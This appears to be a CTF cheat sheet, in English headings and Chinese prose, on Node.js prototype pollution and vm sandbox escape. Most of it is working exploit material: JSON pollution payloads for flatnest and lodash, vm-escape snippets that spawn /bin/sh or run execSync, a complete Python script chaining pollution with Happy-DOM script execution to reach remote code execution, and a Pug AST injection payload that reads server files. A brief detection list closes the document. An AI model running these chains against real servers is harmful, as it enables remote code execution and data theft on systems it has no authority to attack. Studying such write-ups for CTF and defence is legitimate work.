# CTF Web - Node.js Prototype Pollution & VM Escape

## Table of Contents
- [Prototype Pollution Basics](#prototype-pollution-basics)
  - [Common Vectors](#common-vectors)
  - [Known Vulnerable Libraries](#known-vulnerable-libraries)
- [flatnest Circular Reference Bypass (CVE-2023-26135)](#flatnest-circular-reference-bypass-cve-2023-26135)
- [Gadget: Library Settings via Prototype Chain](#gadget-library-settings-via-prototype-chain)
- [Node.js VM Sandbox Escape](#nodejs-vm-sandbox-escape)
  - [ESM-Compatible Escape (CVE-2025-61927)](#esm-compatible-escape-cve-2025-61927)
  - [CommonJS Escape](#commonjs-escape)
  - [Why `document.write` Matters for Happy-DOM](#why-documentwrite-matters-for-happy-dom)
- [Full Chain: Prototype Pollution to VM Escape RCE (4llD4y)](#full-chain-prototype-pollution-to-vm-escape-rce-4lld4y)
- [Lodash Prototype Pollution to Pug AST Injection (VuwCTF 2025)](#lodash-prototype-pollution-to-pug-ast-injection-vuwctf-2025)
- [Affected Libraries](#affected-libraries)
- [Detection](#detection)

---

## Prototype Pollution Basics

JavaScript 对象默认继承自 `Object.prototype`。一旦把它污染，所有对象都会受影响：
```javascript
Object.prototype.isAdmin = true;
const user = {};
console.log(user.isAdmin); // true
```

### Common Vectors
```json
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
{"a.__proto__.isAdmin": true}
```

### Known Vulnerable Libraries
- `flatnest`（CVE-2023-26135）: `nest()` 配合循环引用绕过
- `merge`、`lodash.merge`（旧版本）、`deep-extend`、`qs`（旧版本）

---

## flatnest Circular Reference Bypass (CVE-2023-26135)

**漏洞点：** `insert()` 会拦截 `__proto__`/`constructor`，但 `seek()`（负责解析 `[Circular (path)]`）完全没有对应检查。

**代码流：**
1. `nest(obj)` 遍历各个键
2. 如果值匹配 `[Circular (path)]`，就会调用 `seek(nested, path)`
3. `seek()` 可自由访问 `constructor.prototype`，最终返回 `Object.prototype`
4. 后续键写入就会直接落到 `Object.prototype`

**利用：**
```json
POST /config
{
  "x": "[Circular (constructor.prototype)]",
  "x.settings.enableJavaScriptEvaluation": true
}
```

**说明：** 1.0.1 的“修复”只保护了 `insert()`，没有修 `seek()`，因此实际上仍未彻底修补。

---

## Gadget: Library Settings via Prototype Chain

**模式：** 某些库会从 options 对象读取可选设置。如果调用方没有显式提供设置，就会沿原型链回落到 `Object.prototype`。

**Happy-DOM 示例（v20.x）：**
```javascript
// Window constructor:
constructor(options) {
  const browser = new DetachedBrowser(BrowserWindow, {
    settings: options?.settings  // options = { console }, no own 'settings'
    // With pollution: Object.prototype.settings = { enableJavaScriptEvaluation: true }
  });
}
```

---

## Node.js VM Sandbox Escape

**`vm` 不是安全边界。** 跨边界传递的对象依然保持对宿主上下文的引用。

### ESM-Compatible Escape (CVE-2025-61927)
```javascript
const ForeignFunction = this.constructor.constructor;
const proc = ForeignFunction("return globalThis.process")();
const spawnSync = proc.binding("spawn_sync");
const result = spawnSync.spawn({
  file: "/bin/sh",
  args: ["/bin/sh", "-c", "cat /flag*"],
  stdio: [
    { type: "pipe", readable: true, writable: false },
    { type: "pipe", readable: false, writable: true },
    { type: "pipe", readable: false, writable: true }
  ]
});
const output = Buffer.from(result.output[1]).toString();
```

### CommonJS Escape
```javascript
const ForeignFunction = this.constructor.constructor;
const proc = ForeignFunction("return process")();
const result = proc.mainModule.require("child_process").execSync("id").toString();
```

### Why `document.write` Matters for Happy-DOM
`document.write()` 会创建一个 `evaluateScripts: true` 的解析器，因此脚本不会被标记为 `disableEvaluation`。此时唯一剩下的限制就是 `browserSettings.enableJavaScriptEvaluation`，而这正好可被原型污染绕过。

---

## Full Chain: Prototype Pollution to VM Escape RCE (4llD4y)

**架构：**
1. 污染 `Object.prototype.settings`，在 Happy-DOM 中开启 JS 执行
2. 提交带 `<script>` 的 HTML，并通过 `document.write()` 触发（会设置 `evaluateScripts: true`）
3. 脚本在 VM 中执行，再通过 `this.constructor.constructor` 逃逸，最终获得 RCE

**完整利用：**
```python
import requests
TARGET = "http://target:3000"

# Step 1: Pollution via flatnest circular reference
pollution = {
    "x": "[Circular (constructor.prototype)]",
    "x.settings.enableJavaScriptEvaluation": True,
    "x.settings.suppressInsecureJavaScriptEnvironmentWarning": True
}
requests.post(f"{TARGET}/config", json=pollution)

# Step 2: RCE via VM escape in rendered HTML
rce_script = """
const F = this.constructor.constructor;
const proc = F("return globalThis.process")();
const s = proc.binding("spawn_sync");
const r = s.spawn({
  file: "/bin/sh", args: ["/bin/sh", "-c", "cat /flag*"],
  stdio: [{type:"pipe",readable:true,writable:false},
          {type:"pipe",readable:false,writable:true},
          {type:"pipe",readable:false,writable:true}]
});
document.title = Buffer.from(r.output[1]).toString();
"""
r = requests.post(f"{TARGET}/render", json={"html": f"<script>{rce_script}</script>"})
print(r.text.split("<title>")[1].split("</title>")[0])
```

---

---

## Lodash Prototype Pollution to Pug AST Injection (VuwCTF 2025)

**受影响版本：** Lodash < 4.17.5 的 `_.merge()` 可通过 `constructor.prototype` 实现原型污染。

**Pug 模板引擎 gadget：** Pug 会在 AST 节点上查找 `block` 属性。若节点本身没有 `block`，JavaScript 就会沿原型链继续查找，从而命中被污染的 `Object.prototype.block`。

**载荷：**
```json
{
  "constructor": {
    "prototype": {
      "block": {
        "type": "Text",
        "line": "1;pug_html+=global.process.mainModule.require('fs').readFileSync('/app/flag.txt').toString();//",
        "val": "x"
      }
    }
  },
  "word": "exploit"
}
```

**投递方式：** 将 JSON 做 base64 编码后，通过 `?data=<encoded>` 传入。

**原理：**
1. 对用户输入执行 `_.merge()`，把恶意 AST 节点写入 `Object.prototype.block`
2. Pug 编译模板时会对每个节点访问 `node.block`
3. 没有自有 `block` 的节点会沿原型链继承到恶意 Text 节点
4. `type: "Text"` 配合 `line:` 字段可在模板编译阶段注入代码
5. 代码在服务端执行并读取 flag

**检测：** `package.json` 中存在 `lodash` < 4.17.5，且应用使用 Pug/Jade 模板引擎。

---

## Affected Libraries
- **happy-dom** < 20.0.0（默认启用 JS 执行），20.x+（若能通过污染重新开启）
- **vm2**（已废弃）
- **realms-shim**
- **lodash** < 4.17.5（`_.merge()` 原型污染）

## Detection
- `package.json` 中存在 `flatnest`，且有端点对用户输入调用 `nest()`
- 使用 `happy-dom` 或 `jsdom` 渲染用户可控 HTML
- 任何 `vm.runInContext`、`vm.Script` 的使用点
